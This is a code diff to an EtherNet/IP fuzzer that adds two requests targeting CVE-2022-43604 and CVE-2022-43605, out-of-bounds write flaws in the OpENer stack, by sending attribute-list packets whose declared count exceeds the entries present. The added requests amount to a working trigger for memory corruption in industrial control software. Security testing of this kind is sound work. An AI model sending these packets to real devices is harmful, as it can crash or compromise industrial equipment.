@@ -175,6 +175,13 @@ class EtherNetIPFuzzer(BaseFuzzer):
                 "overflow",
                 requires_state=CommonState.ANY,
             ),
+            RequestInfo(
+                "EIP_Attribute_List_OOB",
+                "Get/Set_Attribute_List with attribute_count > entries present "
+                "(CVE-2022-43604 / CVE-2022-43605)",
+                "overflow",
+                requires_state=CommonState.ANY,
+            ),
             # Phase 3: CVE-targeted writes
             RequestInfo(
                 "EIP_Write_Operations",
@@ -1939,6 +1946,170 @@ class EtherNetIPFuzzer(BaseFuzzer):
             ),
         )
 
+        # ================================================================
+        # CIP Get/Set_Attribute_List with a lying attribute_count.
+        # CVE-2022-43604 (Get_Attribute_List, service 0x03) and
+        # CVE-2022-43605 (Set_Attribute_List, service 0x04): OpENer OOB
+        # write (CWE-787, CVSS 9.8). The request's attribute_count field
+        # claims more attribute entries than the body actually carries; a
+        # parser that trusts the count walks past the end of the received
+        # buffer. attribute_count is the fuzzable field (a Group of
+        # little-endian Word values), and only a single attribute entry is
+        # present below, so any declared count above 1 is an OOB read/write.
+        # 0xFFFF pairs a maximal count with the short 1-entry list; the
+        # smaller values give the boundary desync cases (0/1/2/8/256/0x7FFF).
+        # ================================================================
+
+        # Shared attribute_count values (little-endian Word). Every value
+        # except 0x0001 declares more entries than the single entry present
+        # in the body, so the count over-runs the buffer.
+        _attr_count_oob_values = [
+            b"\xff\xff",  # 0xFFFF declared vs 1 present (maximal OOB)
+            b"\xff\x7f",  # 0x7FFF declared vs 1 present
+            b"\x00\x01",  # 0x0100 = 256 declared vs 1 present
+            b"\x08\x00",  # 8 declared vs 1 present
+            b"\x02\x00",  # 2 declared vs 1 present (smallest desync)
+            b"\x01\x00",  # 1 declared vs 1 present (valid baseline)
+            b"\x00\x00",  # 0 declared (boundary)
+        ]
+
+        # CVE-2022-43604: Get_Attribute_List (service 0x03), attribute_count
+        # exceeds the single attribute-id entry present.
+        get_attribute_list_oob = Request(
+            "EIP_Get_Attribute_List_OOB",
+            children=(
+                Block(
+                    "EIP_Encap_Header_GET_ATTR_LIST",
+                    children=(
+                        Word("Command", 0x006F, endian="<", fuzzable=False),
+                        Size(
+                            "Length",
+                            block_name="CIP_Get_Attr_List_Data",
+                            length=2,
+                            endian="<",
+                            inclusive=False,
+                            fuzzable=False,
+                        ),
+                        DynamicDWord(
+                            "Session_Handle", self._session_handle_value, endian="<", fuzzable=False
+                        ),
+                        DWord("Status", 0x00000000, endian="<", fuzzable=False),
+                        QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
+                        DWord("Options", 0x00000000, endian="<", fuzzable=False),
+                    ),
+                ),
+                Block(
+                    "CIP_Get_Attr_List_Data",
+                    children=(
+                        DWord("Interface_Handle", 0x00000000, endian="<", fuzzable=False),
+                        Word("Timeout", 0x0000, endian="<", fuzzable=False),
+                        Block(
+                            "CPF_Header",
+                            children=(
+                                Word("Item_Count", 0x0002, endian="<", fuzzable=False),
+                                Word("Address_Type", 0x0000, endian="<", fuzzable=False),
+                                Word("Address_Length", 0x0000, endian="<", fuzzable=False),
+                                Word("Data_Type", 0x00B2, endian="<", fuzzable=False),
+                                Size(
+                                    "Data_Length",
+                                    block_name="CIP_Request_GetAttrList",
+                                    length=2,
+                                    endian="<",
+                                    inclusive=False,
+                                    fuzzable=False,
+                                ),
+                            ),
+                        ),
+                        Block(
+                            "CIP_Request_GetAttrList",
+                            children=(
+                                Byte("Service", 0x03, fuzzable=False),  # Get_Attribute_List
+                                Byte("Request_Path_Size", 0x02, fuzzable=False),
+                                Byte("Class_Segment", 0x20, fuzzable=False),
+                                Byte("Class_ID", 0x01, fuzzable=False),  # Identity object
+                                Byte("Instance_Segment", 0x24, fuzzable=False),
+                                Byte("Instance_ID", 0x01, fuzzable=False),
+                                # attribute_count lies about how many attribute
+                                # IDs follow (CVE-2022-43604).
+                                Group("Attribute_Count", values=_attr_count_oob_values),
+                                # Only ONE attribute-id entry is actually present.
+                                Word("Attribute_ID_1", 0x0001, endian="<", fuzzable=False),
+                            ),
+                        ),
+                    ),
+                ),
+            ),
+        )
+
+        # CVE-2022-43605: Set_Attribute_List (service 0x04), attribute_count
+        # exceeds the single attribute-id/data entry present.
+        set_attribute_list_oob = Request(
+            "EIP_Set_Attribute_List_OOB",
+            children=(
+                Block(
+                    "EIP_Encap_Header_SET_ATTR_LIST",
+                    children=(
+                        Word("Command", 0x006F, endian="<", fuzzable=False),
+                        Size(
+                            "Length",
+                            block_name="CIP_Set_Attr_List_Data",
+                            length=2,
+                            endian="<",
+                            inclusive=False,
+                            fuzzable=False,
+                        ),
+                        DynamicDWord(
+                            "Session_Handle", self._session_handle_value, endian="<", fuzzable=False
+                        ),
+                        DWord("Status", 0x00000000, endian="<", fuzzable=False),
+                        QWord("Context", 0x0000000000000000, endian="<", fuzzable=False),
+                        DWord("Options", 0x00000000, endian="<", fuzzable=False),
+                    ),
+                ),
+                Block(
+                    "CIP_Set_Attr_List_Data",
+                    children=(
+                        DWord("Interface_Handle", 0x00000000, endian="<", fuzzable=False),
+                        Word("Timeout", 0x0000, endian="<", fuzzable=False),
+                        Block(
+                            "CPF_Header",
+                            children=(
+                                Word("Item_Count", 0x0002, endian="<", fuzzable=False),
+                                Word("Address_Type", 0x0000, endian="<", fuzzable=False),
+                                Word("Address_Length", 0x0000, endian="<", fuzzable=False),
+                                Word("Data_Type", 0x00B2, endian="<", fuzzable=False),
+                                Size(
+                                    "Data_Length",
+                                    block_name="CIP_Request_SetAttrList",
+                                    length=2,
+                                    endian="<",
+                                    inclusive=False,
+                                    fuzzable=False,
+                                ),
+                            ),
+                        ),
+                        Block(
+                            "CIP_Request_SetAttrList",
+                            children=(
+                                Byte("Service", 0x04, fuzzable=False),  # Set_Attribute_List
+                                Byte("Request_Path_Size", 0x02, fuzzable=False),
+                                Byte("Class_Segment", 0x20, fuzzable=False),
+                                Byte("Class_ID", 0x01, fuzzable=False),  # Identity object
+                                Byte("Instance_Segment", 0x24, fuzzable=False),
+                                Byte("Instance_ID", 0x01, fuzzable=False),
+                                # attribute_count lies about how many
+                                # attribute-id/data entries follow (CVE-2022-43605).
+                                Group("Attribute_Count", values=_attr_count_oob_values),
+                                # Only ONE attribute entry (id + data) present.
+                                Word("Attribute_ID_1", 0x0001, endian="<", fuzzable=False),
+                                Word("Attribute_Data_1", 0x0000, endian="<", fuzzable=False),
+                            ),
+                        ),
+                    ),
+                ),
+            ),
+        )
+
         # TCP/IP Interface Object (Class 0xF5)
         tcpip_get = Request(
             "EIP_TCPIP_Object",
@@ -2399,6 +2570,10 @@ class EtherNetIPFuzzer(BaseFuzzer):
             self.session.connect(forward_open_malformed)  # Oversized conn-path/params
         if self.is_request_enabled("EIP_ConnMgr_Path_Overflow"):
             self.session.connect(conn_mgr_path_overflow)  # Oversized/looping EPATH
+        if self.is_request_enabled("EIP_Attribute_List_OOB"):
+            # attribute_count > entries present -> OOB read/write
+            self.session.connect(get_attribute_list_oob)  # CVE-2022-43604
+            self.session.connect(set_attribute_list_oob)  # CVE-2022-43605
 
         # ==================== PHASE 3: CVE-TARGETED WRITES (~3 min) ====================
         enable_write = self.config.get_option("enable_write", False)
